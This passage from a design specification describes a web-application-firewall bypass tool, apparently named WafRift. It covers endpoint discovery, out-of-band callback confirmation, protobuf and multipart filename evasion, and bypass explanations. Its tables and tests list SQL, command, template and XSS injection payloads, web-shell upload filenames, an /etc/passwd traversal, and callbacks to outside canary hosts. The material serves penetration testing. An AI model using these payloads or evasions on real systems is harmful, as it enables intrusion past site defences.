    pub location: ParameterLocation,
    pub context: InjectionContext,
    pub content_type_hint: Option<String>,
    pub required: bool,
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
pub enum ParameterLocation {
    Query,
    Header,
    Path,
    Body,
    Cookie,
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
pub enum DiscoverySource {
    OpenApi,
    GraphQlIntrospection,
    ParamMining,
    HarFile,
}
```

### 4.4 API Specification

#### 4.4.1 `discovery::from_openapi`
**Location:** `crates/recon/src/discovery/openapi.rs`  
**Signature:**
```rust
pub fn from_openapi(spec: &str) -> Result<Vec<DiscoveredEndpoint>, DiscoveryError>;
```

**Preconditions:**
- `spec` is valid YAML or JSON.

**Postconditions:**
- Returns endpoints for all paths × methods in the spec.
- Skips paths with no parameters or no request body.

**Algorithm:**
```
1. Detect format (JSON vs YAML) by first non-whitespace char.
2. Parse into OpenAPI document.
3. For each path in paths:
   For each method in path (get, post, put, delete, patch):
     a. Create DiscoveredEndpoint with url = basePath + path, method.
     b. For each parameter:
        - Map "in" to ParameterLocation: "query"->Query, "header"->Header, "path"->Path, "formData"->Body
        - Map schema.type + content-type to InjectionContext:
          string + application/json -> JsonString
          integer/number + application/json -> JsonNumber
          string + multipart/form-data -> MultipartField
          file + multipart/form-data -> MultipartFileName
          default -> PlainBody
        - Create InjectionPoint
     c. If requestBody exists:
        - Extract content-type from requestBody.content keys
        - Create InjectionPoint for body with location=Body
     d. Push endpoint.
4. Return endpoints.
```

**Error conditions:**
- `DiscoveryError::SpecParseError { line, reason }` — YAML/JSON parse failure.
- `DiscoveryError::UnsupportedVersion { version }` — OpenAPI version not 2.0, 3.0, or 3.1.

#### 4.4.2 `discovery::from_graphql`
**Location:** `crates/recon/src/discovery/graphql.rs`  
**Signature:**
```rust
pub async fn from_graphql(
    endpoint: &str,
    client: &reqwest::Client,
) -> Result<Vec<DiscoveredEndpoint>, DiscoveryError>;
```

**Algorithm:**
```
1. Send introspection query to endpoint.
   Query: standard GraphQL introspection query for types, fields, args.
2. If response is not 200 or contains errors: return Err(GraphQlEndpointNotFound) or Err(IntrospectionDisabled).
3. Parse response JSON.
4. For each mutation type:
   For each field in mutation type:
     a. URL = endpoint
     b. Method = POST
     c. For each arg in field:
        - Create InjectionPoint with location=Body, context=JsonString (GraphQL args are JSON strings by default).
     d. Push endpoint.
5. For each query type (optional, if --discover-queries flag set):
   Same as mutations but mark as lower priority.
6. Return endpoints.
```

#### 4.4.3 `discovery::mine_params`
**Location:** `crates/recon/src/discovery/param_miner.rs`  
**Signature:**
```rust
pub async fn mine_params(
    target: &str,
    client: &reqwest::Client,
    wordlist: &[String],
    config: &MiningConfig,
) -> Result<Vec<DiscoveredEndpoint>, DiscoveryError>;
```

**`MiningConfig`:**
```rust
pub struct MiningConfig {
    pub concurrency: usize,          // default: 4
    pub delay_ms: u64,               // default: 100
    pub baseline_requests: usize,    // default: 3
    pub body_length_threshold: f64,  // default: 0.10 (10%)
    pub response_time_threshold_ms: u64, // default: 500
}
```

**Algorithm:**
```
1. Send baseline_requests to target without extra params.
2. Record median (status, body_length, response_time_ms) as baseline.
3. For each candidate param in wordlist (in chunks of concurrency):
   a. Send request with ?candidate=wafrift_probe_<uuid>
   b. If status != baseline.status: mark as valid
   c. Else if |body_length - baseline.body_length| / baseline.body_length > threshold: mark as valid
   d. Else if response_time_ms > baseline.response_time_ms + response_time_threshold_ms: mark as valid
   e. Else: mark as invalid
   f. Sleep delay_ms
4. Return DiscoveredEndpoint for target with one InjectionPoint per valid param.
   Location = Query, Context = UrlQuery, Required = false.
```

#### 4.4.4 `discovery::auto_detect_context`
**Location:** `crates/recon/src/discovery/context.rs`  
**Signature:**
```rust
pub fn auto_detect_context(
    content_type: Option<&str>,
    param_location: ParameterLocation,
    schema_type: Option<&str>,
) -> InjectionContext;
```

**Decision table:**
| Content-Type | Location | Schema Type | Context |
|-------------|----------|-------------|---------|
| `application/json` | Body | `string` | `JsonString` |
| `application/json` | Body | `integer`/`number` | `JsonNumber` |
| `application/json` | Body | `boolean` | `PlainBody` |
| `application/xml` | Body | any | `XmlText` |
| `text/xml` | Body | any | `XmlText` |
| `text/html` | Body | any | `HtmlText` |
| `multipart/form-data` | Body | `string` | `MultipartField` |
| `multipart/form-data` | Body | `file` | `MultipartFileName` |
| any | Query | any | `UrlQuery` |
| any | Path | any | `UrlPath` |
| any | Header | any | `HeaderValue` |
| any | Cookie | any | `CookieValue` |
| any | Body | any (unknown) | `PlainBody` |

### 4.5 Integration Points

#### 4.5.1 CLI Subcommand
**File:** `crates/cli/src/discover/mod.rs`

```
wafrift discover --target <URL> [--spec <FILE>] [--introspect] [--mine-params] [--wordlist <FILE>]
```

**Mutual exclusivity:**
- `--spec` and `--introspect` are mutually exclusive with `--mine-params` (different modes).
- Default mode if no flag: `--mine-params` with built-in wordlist.

**Output:** JSON array of `DiscoveredEndpoint` to stdout.

#### 4.5.2 `wafrift scan --from-discovery`
**File:** `crates/cli/src/scan/mod.rs`

```
wafrift scan --from-discovery discovery.json --payload "' OR 1=1--"
```

**Behavior:**
1. Parse `discovery.json`.
2. For each `DiscoveredEndpoint`:
   a. For each `InjectionPoint`:
      i. Run `wafrift scan` equivalent with endpoint URL, method, param name, context.
      ii. Inject payload into the correct location (query, header, body, path, cookie).
3. Aggregate results into single JSON array.

#### 4.5.3 Proxy Passive Discovery
**File:** `crates/proxy/src/main.rs`  
**Behavior:** When proxy observes traffic:
- If request contains GraphQL introspection query: parse response, auto-populate discovery cache.
- If response contains `Content-Type: application/openapi+json`: parse and cache.
- Discovery cache exposed at `GET /_wafrift/discovery.json`.

### 4.6 Error Handling
- `DiscoveryError::SpecParseError { path, line, reason }`
- `DiscoveryError::UnsupportedVersion { version }`
- `DiscoveryError::GraphQlEndpointNotFound { url }`
- `DiscoveryError::IntrospectionDisabled { url }`
- `DiscoveryError::RateLimited { retry_after }`
- `DiscoveryError::WordlistEmpty`

### 4.7 Configuration
```toml
[discovery]
wordlist = "~/.wafrift/wordlists/params.txt"
concurrency = 4
delay_ms = 100
auto_detect_context = true
```

### 4.8 Testing Specification

#### 4.8.1 Unit Tests
**File:** `crates/recon/tests/discovery.rs`

| Test | Input | Expected |
|------|-------|----------|
| `openapi_petstore_v2` | Petstore OpenAPI 2.0 JSON | 13 endpoints, correct paths and params |
| `openapi_petstore_v3` | Petstore OpenAPI 3.0 JSON | Same as v2, context detection correct |
| `openapi_yaml` | Petstore YAML | Same result as JSON version |
| `openapi_malformed` | Invalid JSON | `SpecParseError` |
| `graphql_introspection` | Mock introspection response | Mutations discovered, args mapped to InjectionPoint |
| `auto_detect_json_string` | content-type=application/json, location=Body, type=string | `JsonString` |
| `auto_detect_url_query` | content-type=any, location=Query | `UrlQuery` |

#### 4.8.2 E2E Tests
**File:** `crates/cli/tests/e2e_discovery.rs`

**Test 1: OpenAPI discovery**
- Serve Petstore OpenAPI spec at `/openapi.json`.
- Run: `wafrift discover --target http://localhost:PORT --spec openapi.json`
- Assert: Output contains `/pet` POST with `name` parameter, context=`JsonString`.

**Test 2: GraphQL discovery**
- Wiremock GraphQL endpoint with introspection enabled.
- Run: `wafrift discover --target http://localhost:PORT/graphql --introspect`
- Assert: Output contains `createUser` mutation with `email` arg.

**Test 3: Param mining**
- Wiremock endpoint `/search` that returns 200 only for `?admin=true`.
- Run: `wafrift discover --target http://localhost:PORT/search --mine-params --wordlist wordlist.txt`
- Assert: Output contains `admin` parameter.

#### 4.8.3 Performance Tests
**File:** `crates/recon/benches/discovery.rs`

- Parse 1MB OpenAPI spec → <100ms
- Mine 100 params with concurrency=4 → <5 seconds total

---

## 5. Feature 4: OOB Confirmation

### 5.1 Motivation
A WAF bypass that returns HTTP 200 does not prove the payload executed. OOB confirmation proves the backend processed the payload by triggering an external callback.

### 5.2 Requirements
| ID | Requirement | Priority |
|----|-------------|----------|
| F4-R1 | Support interactsh, Burp Collaborator, and custom DNS providers. | Must |
| F4-R2 | Register canary before sending payload. | Must |
| F4-R3 | Poll asynchronously without blocking the main scan loop. | Must |
| F4-R4 | Confirm bypass only if callback received within timeout. | Must |
| F4-R5 | Canary IDs must be cryptographically random (not predictable). | Must |
| F4-R6 | Embed canary into payload based on PayloadType. | Must |
| F4-R7 | Graceful degradation if OOB provider is unreachable. | Must |

### 5.3 Data Model

#### 5.3.1 `OobConfig`
New file: `crates/types/src/oob.rs`

```rust
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct OobConfig {
    pub provider: OobProvider,
    pub poll_interval_secs: u64,
    pub timeout_secs: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum OobProvider {
    Interactsh { server: String },
    BurpCollaborator { url: String },
    CustomDns { pattern: String },  // e.g. "$(uuid).callbacks.example.com"
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct OobCanary {
    pub id: Uuid,
    pub expected_dns: String,
    pub expected_http_path: String,
    pub created_at: Instant,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum OobInteraction {
    DnsQuery { query: String, source_ip: String },
    HttpRequest { path: String, headers: Vec<(String, String)>, body: Option<String> },
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
pub enum OobConfirmation {
    Confirmed,
    Timeout,
    Error,
}
```

**Canary generation:**
- `id`: `Uuid::new_v4()` (crypto-random, not `thread_rng`).
- `expected_dns`: Replace `$(uuid)` in provider pattern with `id` (no hyphens).
- `expected_http_path`: `/wafrift-oob/{id}`.

### 5.4 API Specification

#### 5.4.1 `OobProvider` trait
New file: `crates/oracle/src/oob/provider.rs`

```rust
#[async_trait]
pub trait OobProvider: Send + Sync + std::fmt::Debug {
    async fn register(&self) -> Result<OobCanary, OobError>;
    async fn poll(&self, canary: &OobCanary) -> Result<Vec<OobInteraction>, OobError>;
}
```

**Implementations:**
- `InteractshProvider`
- `CollaboratorProvider`
- `CustomDnsProvider` (mockable for tests)

#### 5.4.2 `OobOracle`
New file: `crates/oracle/src/oob/oracle.rs`

```rust
pub struct OobOracle {
    provider: Box<dyn OobProvider>,
    config: OobConfig,
}

impl OobOracle {
    pub fn new(provider: Box<dyn OobProvider>, config: OobConfig) -> Self;

    /// Send OOB payload and wait for confirmation.
    /// Blocks until timeout or confirmation.
    pub async fn confirm(
        &self,
        payload: &str,
        payload_type: PayloadType,
    ) -> Result<OobConfirmation, OobError>;

    /// Start background polling. Returns a channel receiver.
    pub async fn confirm_background(
        &self,
        payload: &str,
        payload_type: PayloadType,
    ) -> Result<tokio::sync::mpsc::Receiver<OobConfirmation>, OobError>;
}
```

#### 5.4.3 `oob::embed_canary`
New file: `crates/oracle/src/oob/embed.rs`

```rust
pub fn embed_canary(
    payload: &str,
    canary: &OobCanary,
    payload_type: PayloadType,
) -> String;
```

**Embedding rules by PayloadType:**
| PayloadType | Embedding Strategy | Example Output |
|-------------|-------------------|----------------|
| `Sql` | `LOAD_FILE('\\\\{canary_dns}\\a')` or `pg_sleep(10)` variant with DNS | `UNION SELECT LOAD_FILE('\\\\abc123.oast.fun\\a')` |
| `CommandInjection` | `nslookup {canary_dns}` or `curl http://{canary_http}` | `; nslookup abc123.oast.fun ;` |
| `Ssrf` | `http://{canary_http}/` | `http://abc123.oast.fun/wafrift-oob/abc123` |
| `Xss` | `<img src="//{canary_http}/">` | `<img src="//abc123.oast.fun/wafrift-oob/abc123">` |
| `TemplateInjection` | `{{ request.application.__globals__.__builtins__.__import__('os').popen('nslookup {canary_dns}').read() }}` | Platform-specific |
| `NoSql` | `$where: "sleep(1000)"` (no direct OOB; skip) | Original payload |
| `PathTraversal` | `../../../../etc/passwd?{canary}` (unlikely OOB; skip) | Original payload |
| `Unknown` | Skip OOB embedding | Original payload |

**Behavior if embedding is not possible:** Return original payload. `confirm()` will return `Timeout` (no callback expected).

#### 5.4.4 `confirm()` algorithm
```
1. canary = provider.register().await?
2. oob_payload = embed_canary(payload, canary, payload_type)
3. Send oob_payload to target (via transport)
4. deadline = now + timeout_secs
5. loop:
   a. interactions = provider.poll(canary).await?
   b. If interactions not empty:
      - Log interactions
      - Return Ok(Confirmed)
   c. If now >= deadline:
      - Return Ok(Timeout)
   d. Sleep poll_interval_secs
```

### 5.5 Integration Points

#### 5.5.1 `EvasionPipeline`
**File:** `crates/strategy/src/pipeline.rs`

Add `OOB_CONFIRM` stage after `ORACLE`:
```
ORACLE → OOB_CONFIRM (optional) → EXPLAIN → PERSIST
```

**Behavior:**
- If `OobConfig` is present AND `Verdict::Bypass`:
  - Spawn `OobOracle::confirm_background()`.
  - Continue pipeline (don't block).
  - When confirmation channel returns:
    - `Confirmed`: Mark finding as `confirmed: true`.
    - `Timeout`: Mark finding as `confirmed: false`.
    - `Error`: Log warning, mark as `confirmed: false`.
- If `OobConfig` absent: skip stage.

#### 5.5.2 CLI Integration
**New flags:**
```
--oob-provider <interactsh|collaborator|custom>
--oob-server <URL>          # For interactsh or custom
--oob-timeout <SECS>        # Default: 30
--oob-poll-interval <SECS>  # Default: 5
```

#### 5.5.3 Proxy Integration
**File:** `crates/proxy/src/main.rs`

- Background tokio task polls OOB interactions for pending canaries.
- `/_wafrift/findings.md` includes confirmation status: `✅ Confirmed` or `⏱️ Timeout`.

### 5.6 Error Handling
- `OobError::ProviderUnavailable { url, status }`
- `OobError::RegistrationFailed { reason }`
- `OobError::PollFailed { reason }`
- `OobError::Timeout`
- `OobError::InvalidPayloadType { payload_type }`

### 5.7 Configuration
```toml
[oob]
provider = "interactsh"
server = "https://oast.pro"
poll_interval_secs = 5
timeout_secs = 30
```

### 5.8 Testing Specification

#### 5.8.1 Unit Tests
**File:** `crates/oracle/tests/oob.rs`

| Test | Setup | Action | Expected |
|------|-------|--------|----------|
| `canary_generation` | Any provider config | `register()` | UUIDv4, DNS contains no hyphens |
| `embed_canary_sql` | SQL payload | `embed_canary(..., Sql)` | Contains `LOAD_FILE` with canary DNS |
| `embed_canary_cmd` | CMD payload | `embed_canary(..., CommandInjection)` | Contains `nslookup` with canary DNS |
| `embed_canary_nosql` | NoSQL payload | `embed_canary(..., NoSql)` | Returns original payload (no OOB) |
| `mock_provider_confirm` | MockProvider returns interaction on poll 2 | `confirm()` | `Confirmed` |
| `mock_provider_timeout` | MockProvider returns empty | `confirm()` | `Timeout` |

#### 5.8.2 Property Tests
**Invariant:** `embed_canary(payload, canary, pt)` always contains `canary.id.to_string().replace("-", "")` if pt supports OOB.

#### 5.8.3 E2E Tests
**File:** `crates/cli/tests/e2e_oob.rs`

**Test 1: SQL OOB confirmation**
- Mock server that blocks `UNION` but allows `LOAD_FILE`.
- Mock OOB provider that records DNS queries.
- Run: `wafrift scan ... --oob-provider custom --oob-server http://mock`
- Assert: Finding marked `confirmed: true`.

**Test 2: SSRF OOB confirmation**
- Mock server vulnerable to SSRF.
- Run: `wafrift scan ... --payload "http://127.0.0.1" --oob-provider custom`
- Assert: OOB HTTP request received at canary path.

#### 5.8.4 Concurrency Tests
- 50 simultaneous `confirm_background()` calls with shared provider.
- Assert: All canaries are unique, no UUID collisions.

#### 5.8.5 Security Tests
| Test | Action | Expected |
|------|--------|----------|
| `canary_not_predictable` | Generate 1000 canaries | No duplicates, no sequential pattern |
| `canary_not_logged` | Enable DEBUG tracing | Canary ID does not appear in logs at INFO level (DEBUG is OK) |

---

## 6. Feature 5: Modern Protocol & Format Support

### 6.1 Motivation
Many APIs use Protobuf, MessagePack, or gRPC-Web. WAFs often inspect these formats poorly or not at all. Supporting them extends WafRift's bypass surface significantly.

### 6.2 Requirements
| ID | Requirement | Priority |
|----|-------------|----------|
| F5-R1 | Lightweight protobuf serialization without `protoc` dependency. | Must |
| F5-R2 | MessagePack serialization via `rmp-serde`. | Must |
| F5-R3 | gRPC-Web frame wrapping (1-byte compression flag + 4-byte length + protobuf body). | Must |
| F5-R4 | Multipart filename evasion (null byte, double extension, RTL override, trailing dots). | Must |
| F5-R5 | WebSocket upgrade smuggling (send bypass over WS tunnel). | Should |
| F5-R6 | All formats must preserve payload semantics and be round-trippable. | Must |
| F5-R7 | Gate protobuf support behind Cargo feature `protobuf` if dependency is large. | Should |

### 6.3 Data Model

#### 6.3.1 `BodyFormat`
New file: `crates/types/src/format.rs`

```rust
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
pub enum BodyFormat {
    Json,
    Xml,
    Multipart,
    Protobuf,
    MessagePack,
    GrpcWeb,
    Raw,
}
```

#### 6.3.2 `ProtobufField`
New file: `crates/content-type/src/formats/protobuf.rs`

```rust
pub struct ProtobufField {
    pub field_number: u32,
    pub wire_type: WireType,
    pub value: ProtobufValue,
}

pub enum WireType {
    Varint = 0,
    I64 = 1,
    Len = 2,
    I32 = 5,
}

pub enum ProtobufValue {
    String(String),
    Bytes(Vec<u8>),
}
```

### 6.4 API Specification

#### 6.4.1 `formats::serialize`
**Location:** `crates/content-type/src/formats/mod.rs`  
**Signature:**
```rust
pub fn serialize(
    payload: &str,
    format: BodyFormat,
    context: InjectionContext,
) -> Result<Vec<u8>, FormatError>;
```

**Preconditions:**
- `payload` is valid UTF-8.
- `format` is not `BodyFormat::Raw` (use `payload.as_bytes()` directly for Raw).

**Postconditions:**
- On `Ok(bytes)`: bytes are valid for the given format.
- On `Err`: format cannot represent the payload in this context.

**Algorithm for Protobuf:**
```
1. Wrap payload in a string field (field_number=1, wire_type=Len).
2. tag = (1 << 3) | 2 = 0x0A
3. length = varint_encode(payload.len())
4. body = payload.as_bytes()
5. Return [tag, length..., body...]
```

**Algorithm for MessagePack:**
```
1. Create JSON object: {"payload": payload}
2. Serialize with rmp-serde to MessagePack
3. Return bytes
```

**Algorithm for gRPC-Web:**
```
1. protobuf_body = serialize(payload, Protobuf, context)?
2. compression_flag = 0x00 (no compression)
3. length = protobuf_body.len() as u32 (big-endian)
4. Return [compression_flag, length_bytes[0..4], protobuf_body...]
```

**Algorithm for Multipart Filename Evasion:**
```
1. Generate 8 variants of filename:
   a. original
   b. shell.php%00.jpg
   c. shell.php\x00.jpg
   d. shell.jpg.php
   e. shell.p\x00hp
   f. shell.php\u202ejpg (Unicode RTL override)
   g. shell.php.... (trailing dots)
   h. shell.php%0d.jpg (CR injection)
2. Filter out invalid UTF-8 variants.
3. Return up to 8 variants.
```

#### 6.4.2 `formats::deserialize`
**Signature:**
```rust
pub fn deserialize(bytes: &[u8], format: BodyFormat) -> Result<String, FormatError>;
```

**Purpose:** Round-trip testing only. Extracts the payload string from the serialized format.

**Protobuf deserialization:**
```
1. Read first byte: expect 0x0A (field 1, wire type 2).
2. Read varint length.
3. Read length bytes as UTF-8 string.
4. Return string.
```

### 6.5 Integration Points

#### 6.5.1 `EvasionPipeline`
**File:** `crates/strategy/src/pipeline.rs`

Add `FORMAT` stage between `MUTATE` and `SESSION`:
```
MUTATE → FORMAT (optional) → SESSION → TRANSPORT
```

**Behavior:**
- If `BodyFormat` is not `Raw`:
  - Take the mutated payload string.
  - Call `serialize(payload, format, context)`.
  - Set request body to returned bytes.
  - Set `Content-Type` header to appropriate MIME type.
- If serialization fails: skip this variant.

#### 6.5.2 CLI Integration
**New flags:**
```
--format <json|xml|protobuf|messagepack|grpc-web|multipart|raw>
--message-type <NAME>   # Future use for protobuf schema
```

#### 6.5.3 Proxy Integration
**File:** `crates/proxy/src/main.rs`

- Inspect outgoing `Content-Type`.
- If `application/grpc-web` or `application/x-protobuf`: auto-detect format and apply evasion.
- For multipart uploads: apply filename evasion variants.

### 6.6 Error Handling
- `FormatError::UnsupportedFormat { format }`
- `FormatError::SerializationFailed { reason }`
- `FormatError::ContextIncompatible { format, context }`
- `FormatError::PayloadTooLarge { size, max }` (max 2GB for protobuf, 16MB for MessagePack)

### 6.7 Configuration
```toml
[formats]
protobuf_enabled = true
messagepack_enabled = true
grpc_web_enabled = true
multipart_filename_evasion = true
```

### 6.8 Testing Specification

#### 6.8.1 Unit Tests
**File:** `crates/content-type/tests/formats.rs`

| Test | Input | Format | Expected |
|------|-------|--------|----------|
| `protobuf_roundtrip` | `hello` | `Protobuf` | `deserialize(serialize(x)) == x` |
| `messagepack_roundtrip` | `{"a":"b"}` | `MessagePack` | Same |
| `grpc_web_frame` | `test` | `GrpcWeb` | First byte 0x00, next 4 bytes = length |
| `multipart_filename_variants` | `shell.php` | N/A | At least 5 valid variants |
| `multipart_filename_null` | `shell.php` | N/A | Variant contains null byte |
| `multipart_filename_rtl` | `shell.php` | N/A | Variant contains U+202E |

#### 6.8.2 Property Tests
**Invariant:** `deserialize(serialize(s, f, c), f) == s` for all `f` in `[Protobuf, MessagePack, GrpcWeb]` and all contexts `c`.

#### 6.8.3 E2E Tests
**File:** `crates/cli/tests/e2e_formats.rs`

**Test 1: Protobuf bypass**
- Mock server accepts protobuf POST.
- Mock WAF inspects JSON only.
- Run: `wafrift scan ... --format protobuf`
- Assert: Bypass achieved, server parses payload correctly.

**Test 2: Multipart filename evasion**
- Mock file upload endpoint with extension whitelist (`.jpg` allowed, `.php` blocked).
- Run: `wafrift scan ... --format multipart`
- Assert: At least one filename variant reaches server.

#### 6.8.4 Fuzz Tests
**File:** `crates/content-type/fuzz/fuzz_formats.rs`

- Random bytes + random format → must not panic.
- Random string + Protobuf → serialize → deserialize → compare.

---

## 7. Feature 6: Per-Finding Explanation Engine

### 7.1 Motivation
When a bypass works, the user needs to know **why** it worked to write reports and defend against regressions. The explanation engine maps bypass techniques to specific WAF rules.

### 7.2 Requirements
| ID | Requirement | Priority |
|----|-------------|----------|
| F6-R1 | Map bypass techniques to specific WAF rules that blocked the original payload. | Must |
| F6-R2 | Show textual diff between original and bypassed payload. | Must |
| F6-R3 | Generate human-readable summary explaining the bypass. | Must |
| F6-R4 | Support three explanation modes: Minimal, Standard, Educational. | Must |
| F6-R5 | Explanations must be deterministic for identical inputs. | Must |
| F6-R6 | Educational mode must include "why this works" with references to parser/WAF behavior. | Should |

### 7.3 Data Model

#### 7.3.1 `Explanation`
New file: `crates/types/src/explanation.rs`

```rust
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct Explanation {
    pub original_payload: String,
    pub bypass_payload: String,
    pub technique_chain: Vec<Technique>,
    pub triggered_rules: Vec<RuleAttribution>,
    pub diff: Vec<DiffHunk>,
    pub human_summary: String,
    pub mode: ExplanationMode,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct RuleAttribution {
    pub rule_id: String,
    pub rule_name: String,
    pub matched_substring: String,
    pub matched_pattern: String,
    pub confidence: f64,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum DiffHunk {
    Equal(String),
    Delete(String),
    Insert(String),
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, Default)]
pub enum ExplanationMode {
    Minimal,      // Rule IDs only
    #[default]
    Standard,     // Rule IDs + technique + diff summary
    Educational,  // Standard + "why this works" + references
}
```

### 7.4 API Specification

#### 7.4.1 `detect::explain_block`
**Location:** `crates/detect/src/explain.rs` (new module)  
**Signature:**
```rust
pub fn explain_block(
    payload: &str,
    waf: &DetectedWaf,
) -> Vec<RuleAttribution>;
```

**Preconditions:**
- `waf` is a successfully detected WAF with loaded rules.

**Postconditions:**
- Returns all rules in the WAF's signature set that would match the payload.
- Sorted by `confidence` descending.

**Algorithm:**
```
1. Load all detection rules for waf.name from compiled rule database.
2. Initialize empty attributions vector.
3. For each rule in rules:
   a. If rule has body_patterns:
      For each pattern in body_patterns:
        i. Compile pattern to regex (cached).
        ii. If pattern matches payload:
            - Find the matched substring (first match).
            - Create RuleAttribution:
              rule_id = rule.id or rule.name
              rule_name = rule.name
              matched_substring = matched text
              matched_pattern = pattern string
              confidence = rule.confidence_weight
            - Push to attributions.
   b. If rule has headers / cookies / status checks:
      Skip (these apply to HTTP responses, not payload bodies).
4. Sort attributions by confidence descending.
5. Return attributions.
```

**Note:** This requires the detect crate to expose its internal rule patterns. Currently rules are compiled into a `RegexSet` for scoring. `explain_block` needs access to individual patterns and their metadata.

#### 7.4.2 `strategy::explain_bypass`
**Location:** `crates/strategy/src/explain.rs` (new module)  
**Signature:**
```rust
pub fn explain_bypass(
    original: &str,
    bypass: &str,
    techniques: &[Technique],
    waf: &DetectedWaf,
    mode: ExplanationMode,
) -> Explanation;
```

**Algorithm:**
```
1. original_rules = detect::explain_block(original, waf)
2. bypass_rules = detect::explain_block(bypass, waf)
   // Expected to be empty for a true bypass
3. diff = textual_diff(original, bypass)
   // Use Myers diff algorithm or similar
   // Max diff size: 10KB per payload
4. summary = generate_human_summary(original_rules, techniques, &diff, mode)
5. Return Explanation { ... }
```

#### 7.4.3 `generate_human_summary`
**Signature:**
```rust
fn generate_human_summary(
    attributions: &[RuleAttribution],
    techniques: &[Technique],
    diff: &[DiffHunk],
    mode: ExplanationMode,
) -> String;
```

**Standard mode algorithm:**
```
For each attribution in attributions:
  1. Find the technique in techniques that most likely removed the matched pattern.
     Heuristic: technique description contains a keyword from the matched substring,
     OR the technique is a grammar mutation and the matched substring is a grammar token.
  2. Generate sentence:
     "WAF rule `{rule_id}` (`{rule_name}`) blocked `{matched_substring}`.
      Technique `{technique_name}` transformed it, removing the match against
      pattern `{matched_pattern}`."

Append paragraph:
  "Original payload ({original_len} chars) → Bypass payload ({bypass_len} chars).
   Key differences: {diff_summary}"

diff_summary = for each DiffHunk::Delete: "removed `{text}`",
               for each DiffHunk::Insert: "added `{text}`"
               (truncated to first 3 changes)
```

**Educational mode additions:**
```
For each technique used:
  Append: "Why `{technique_name}` works: {technique.description}.
   This exploits the discrepancy between how {waf_name} parses
   {aspect} and how the backend application server parses it."

If waf-specific educational text exists in rules/educational/*.md:
  Append relevant paragraph.
```

#### 7.4.4 `textual_diff`
**Signature:**
```rust
fn textual_diff(original: &str, modified: &str) -> Vec<DiffHunk>;
```

**Algorithm:** Myers diff algorithm, O((N+M)D) where D is edit distance.  
**Max input size:** 10KB per string. If larger, truncate with `...` indicator.  
**Output limit:** Max 50 hunks. If exceeded, truncate and append `...` hunk.

### 7.5 Integration Points

#### 7.5.1 `EvasionPipeline`
**File:** `crates/strategy/src/pipeline.rs`

Add `EXPLAIN` stage after `OOB_CONFIRM`:
```
OOB_CONFIRM → EXPLAIN (optional) → PERSIST
```

**Behavior:**
- If `ExplanationMode` is not `Minimal` (or `--explain` flag is set):
  - After bypass is confirmed, call `explain_bypass()`.
  - Attach `Explanation` to `EvasionResult`.
- If no WAF detected: `triggered_rules` is empty, `human_summary` says "No WAF detected; bypass achieved against unknown rules."

#### 7.5.2 CLI Integration
**New flags:**
```
--explain                    # Enable Standard mode explanations
--explain-mode <MODE>        # minimal | standard | educational
```

#### 7.5.3 Report Integration
**File:** `crates/cli/src/report/mod.rs`

When `--include-explanations` is set:
- Markdown report includes a table of `RuleAttribution` per finding.
- Includes diff block (```diff ... ```).
- Educational mode appends "Why this works" section.

#### 7.5.4 Proxy Integration
**File:** `crates/proxy/src/main.rs`

- `/_wafrift/findings.md` includes explanation summary for each finding.
- `/_wafrift/status` JSON includes `explanations_available: bool`.

### 7.6 Error Handling
- `ExplanationError::WafUnknown { waf_name }` — no rules loaded for detected WAF.
- `ExplanationError::DiffFailed { reason }` — diff algorithm failed (e.g., inputs too large).
- `ExplanationError::RuleDatabaseInaccessible` — compiled rules not available.

**Fallback behavior:** If explanation generation fails, log warning and return `Explanation` with empty `triggered_rules` and `human_summary = "Explanation unavailable: {reason}"`.

### 7.7 Configuration
```toml
[explain]
enabled = true
mode = "standard"   # minimal | standard | educational
max_diff_size_kb = 10
max_hunks = 50
```

### 7.8 Testing Specification

#### 7.8.1 Unit Tests
**File:** `crates/detect/tests/explain.rs`

| Test | Payload | WAF | Expected Attribution |
|------|---------|-----|---------------------|
| `explain_union_blocked` | `UNION SELECT` | ModSecurity | Rule containing `(?i)\bunion\b` |
| `explain_script_blocked` | `<script>` | Cloudflare | Rule containing `<script` |
| `explain_no_match` | `hello world` | Any | Empty vector |

**File:** `crates/strategy/tests/explain.rs`

| Test | Original | Bypass | Techniques | Expected Summary Contains |
|------|----------|--------|------------|---------------------------|
| `summary_comment_insertion` | `UNION` | `UN/**/ION` | `[GrammarCommentInsertion]` | "blocked `UNION`", "`UN/**/ION`" |
| `summary_encoding` | `<script>` | `&lt;script&gt;` | `[HtmlEntityEncode]` | "`&lt;script&gt;`", "HtmlEntityEncode" |
| `diff_basic` | `abc` | `aXc` | `[Replace]` | `Delete("b")`, `Insert("X")` |

#### 7.8.2 Property Tests
**Invariant 1:** `explain_block(payload, waf)` is deterministic — same input → same output.  
**Invariant 2:** `explain_bypass(original, bypass, techniques, waf, mode).triggered_rules` is non-empty if `explain_block(original, waf)` is non-empty.  
**Invariant 3:** `textual_diff(a, a)` returns `[Equal(a)]`.

#### 7.8.3 Snapshot Tests
**File:** `crates/cli/tests/snapshots/explain_*.snap`

- 5 representative bypass scenarios (SQL comment, encoding, grammar, smuggling, content-type).
- Run `generate_human_summary` → compare against `insta` snapshot.
- If output changes, CI fails until snapshot is reviewed and updated.

#### 7.8.4 E2E Tests
**File:** `crates/cli/tests/e2e_explain.rs`

**Test 1: Standard explanation**
- Mock WAF with single rule: `(?i)\bunion\b`.
- Run: `wafrift scan ... --explain`
- Assert: Output contains "WAF rule `SQLI-001` blocked `UNION`. Technique `GrammarCommentInsertion` transformed it to `UN/**/ION`."

**Test 2: Educational explanation**
- Same setup, `--explain-mode educational`.
- Assert: Output contains "Why `GrammarCommentInsertion` works" and reference to regex tokenization behavior.

#### 7.8.5 Performance Tests
**File:** `crates/detect/benches/explain.rs`

- `explain_block` on 1MB payload against 160 WAFs → <50ms median.
